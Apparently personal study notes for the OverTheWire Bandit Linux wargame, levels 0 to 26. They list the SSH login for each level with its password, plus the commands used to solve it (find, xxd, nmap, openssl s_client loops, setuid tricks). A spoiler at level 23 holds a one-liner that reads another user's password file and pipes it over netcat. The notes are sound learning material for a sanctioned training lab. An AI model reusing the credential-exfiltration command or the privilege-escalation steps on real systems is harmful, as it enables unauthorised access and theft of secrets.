# Bandit - used to learn bash shell & Linux system

{% embed url="https://overthewire.org/wargames/bandit/bandit2.html" %}

[Good source](https://hackinganarchy.wordpress.com/2020/01/20/overthewire-bandit-writeup/) (better source)

imagine you have successfully launched a reverse shell hack.\
Now, ideally, you want to move to the privilege escalation stage.

```bash
ssh -p 2220 bandit0@bandit.labs.overthewire.org

ssh -p 2220 bandit1@bandit.labs.overthewire.org
boJ9jbbUNNfktd78OOpsqOltutMc3MY1

ssh -p 2220 bandit2@bandit.labs.overthewire.org
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

ssh -p 2220 bandit3@bandit.labs.overthewire.org
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

ssh -p 2220 bandit4@bandit.labs.overthewire.org
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```

### LV4

```bash
find . -type f ! -executable -exec file {} +

ssh -p 2220 bandit5@bandit.labs.overthewire.org
koReBOKuIDDepwhWk7jZC0RTdopnAYKh

ssh -p 2220 bandit6@bandit.labs.overthewire.org
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```

### LV6 - IMPORTANT

#### This level teach you how to find a file based on the group and user it belongs to.

```
The password for the next level is stored somewhere on the server 
and has all of the following properties:

    owned by user bandit7
    owned by group bandit6
    33 bytes in size
```

```bash
find . -group bandit6 -user bandit7 -size -34c
    
    -size -34c   # less than 34 bytes
```

#### Filter "Permission denied"

```
find . -size -34c -group bandit6 -user bandit7 2>/dev/null

cat ./var/lib/dpkg/info/bandit7.password
```

#### Explanation

```
> 
    redirects stdout
    
1> file 
    redirects stdout to file

2> file 
    redirects stderr to file

&> file 
    redirects stdout and stderr to file

2>/dev/null
    redirects stderr to null === do nothing with stderr
```

```bash
ssh -p 2220 bandit7@bandit.labs.overthewire.org
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

ssh -p 2220 bandit8@bandit.labs.overthewire.org
cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```

### LV8

{% hint style="info" %}
Note: 'uniq' does not detect repeated lines unless they are adjacent. \
You may want to sort the input first.
{% endhint %}

```
sort data.txt | uniq -c
sort data.txt | uniq -c | sort -rn  # reverse numeric sort
```

```bash
ssh -p 2220 bandit9@bandit.labs.overthewire.org
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

# grep data.txt -a -e =
# not clean but, can be boring
ssh -p 2220 bandit10@bandit.labs.overthewire.org
truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

ssh -p 2220 bandit11@bandit.labs.overthewire.org
IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

# tr...
ssh -p 2220 bandit12@bandit.labs.overthewire.org
5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```

### LV12

{% hint style="info" %}
A “hex dump” is a representation of a **binary data stream** where the contents of that stream are displayed as **hexadecimal values**.
{% endhint %}

```
bandit12@bandit:~$ file data.txt
data.txt: ASCII text
bandit12@bandit:~$ cat data.txt
00000000: 1f8b 0808 0650 b45e 0203 6461 7461 322e  .....P.^..data2.
00000010: 6269 6e00 013d 02c2 fd42 5a68 3931 4159  bin..=...BZh91AY
```

Look at that data2.bin: `.....P.^..data2.bin..=...BZh91AY`\
And all the **hex** lines like: `6269 6e00 013d 02c2 fd42 5a68 3931 4159`\
It's an hexdump of a binary! (yeah it's written...)\
\
Convert to a binary:

```
xxd -r data.txt > data
```

Let's check the file!

```
data: bandit12@bandit:/tmp/tmp1$ file data
    gzip compressed data, was "data2.bin", 
    last modified: Thu May  7 18:14:30 2020, 
    max compression, from Unix
```

```bash
ssh -p 2220 bandit13@bandit.labs.overthewire.org
8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```

### LV13

I invite to think what happened here.

{% hint style="danger" %}
You can connect using localhost, **but you can't connect using your pc and the private key with bandit.labs.overthewire.org.**\
****\
**Remote connection filter bypassed ? Maybe....**\
**Is this a connection to another device in the local LAN of our ssh host connection ? Maybe....**
{% endhint %}

```shell
# ssh -i sshkey.private bandit14@localhost
ssh -p 2220 bandit14@bandit.labs.overthewire.org
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
```

### LV14

{% hint style="danger" %}
Wait, what program is running behind port 30000 ?
{% endhint %}

```
nmap -p 30000 localhost
```

{% hint style="info" %}
$ man nc

**netcat is a simple unix utility which reads and writes data across network connection**
{% endhint %}

```bash
ssh -p 2220 bandit15@bandit.labs.overthewire.org
BfMYroe26WYalil77FoDi9qh59eK5xNr
```

### LV15

{% hint style="info" %}
The s\_client command implements a generic SSL/TLS client which connects to a remote host using SSL/TLS. It is a very useful diagnostic tool for SSL servers.\
\
$ man s\_client\
$ openssl s\_client \[-help]
{% endhint %}

```bash
openssl s_client -connect localhost:30001

ssh -p 2220 bandit16@bandit.labs.overthewire.org
cluFn7wTiGryunymYOu4RcffSxQluehd
```

### LV16 - IF BASH WIP

Ok. Let's roll.

```bash
nmap -p 31000-32000 localhost 

Starting Nmap 7.40 ( https://nmap.org ) at 2022-03-24 21:58 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00031s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown
```

{% embed url="https://regex101.com" %}

```bash
nmap -p 31000-32000 localhost | 
    grep -e ^[0-9] | 
    awk -F/ '{ print $1}'

31046
31518
31691
31790
31960
```

```bash
nmap -p 31000-32000 localhost | 
    grep -e ^[0-9] | 
    awk -F/ '{ print $1}' | 
    while read port; do 
        output=$(echo "" | openssl s_client -connect localhost:"$port" 2>/dev/null | grep -e "Renegotiation IS supported")
        if [ "$output" ]; then
            echo $port
        fi
    done 
    
```

```bash
chmod 700 privkbandit
ssh -p 2220 -i /path/to/private/key bandit17@bandit.labs.overthewire.org

ssh -p 2220 bandit18@bandit.labs.overthewire.org cat ./readme
kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd

ssh -p 2220 bandit19@bandit.labs.overthewire.org
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```

### LV19

{% embed url="https://res.cloudinary.com/lwgatsby/f_auto/www/uploads/2021/02/permission-structure.png" %}

```bash
id
uid=11019(bandit19) gid=11019(bandit19) groups=11019(bandit19)

stat /etc/bandit_pass/bandit20
Access: (0400/-r--------)  Uid: (11020/bandit20)   Gid: (11020/bandit20)

./bandit20-do id
uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)
```

```
# you can't sudo inside bandit, but I wanted to see it in my VM

sudo id
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),119(wireshark),142(kaboxer)
```

#### RUID vs EUID

{% hint style="info" %}
euid

Allows the process to _temporarily_ raise and lower privileges as it needs.
{% endhint %}

```bash
ssh -p 2220 bandit20@bandit.labs.overthewire.org
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```

### LV20

{% hint style="info" %}
microservices
{% endhint %}

```bash
ssh -p 2220 bandit21@bandit.labs.overthewire.org
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

ssh -p 2220 bandit22@bandit.labs.overthewire.org
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

ssh -p 2220 bandit23@bandit.labs.overthewire.org
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

### LV23

```bash
stat /usr/bin/cronjob_bandit23.sh
Access: (0750/-rwxr-x---)  Uid: (11023/bandit23)   Gid: (11022/bandit22)

stat /usr/bin/cronjob_bandit24.sh
Access: (0750/-rwxr-x---)  Uid: (11024/bandit24)   Gid: (11023/bandit23)
```

```bash
#!/bin/bash

myname=bandit24

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Ok something is going on in folder:\
`/var/spool/bandit24`

```
stat /var/spool/bandit24/
Access: (0773/drwxrwx-wx)  Uid: (    0/    root)   Gid: (11024/bandit24)
```

`That wx...`

```
timeout -s 9 60 ./$i

kill -l

Uh...
```

{% hint style="warning" %}
The script is executed and after 60 second receive a SIGKILL
{% endhint %}

{% hint style="info" %}
What could I do if I was bandit24 for 60 second?&#x20;
{% endhint %}

I could send text to a microservices...

```
# listen port on bandit23
nc -l -p 5001
```

```
# script executed by bandit24
echo "ciao" | nc 127.0.0.1 5001
```

Well... Now, should be easy...

<details>

<summary>spoiler</summary>

```
cat /etc/bandit_pass/bandit24 | nc 127.0.0.1 5001
```

</details>

```bash
ssh -p 2220 bandit24@bandit.labs.overthewire.org
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

### LV24

<details>

<summary>spoiler</summary>

Yes, you have to do a brute force.\
Idk if there is another way.\
Good thing is that you can use what you want to create the logic.

</details>

```bash
ssh -p 2220 bandit25@bandit.labs.overthewire.org
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

ssh -i privkeybandit26.txt -p 2220 bandit26@bandit.labs.overthewire.org


```
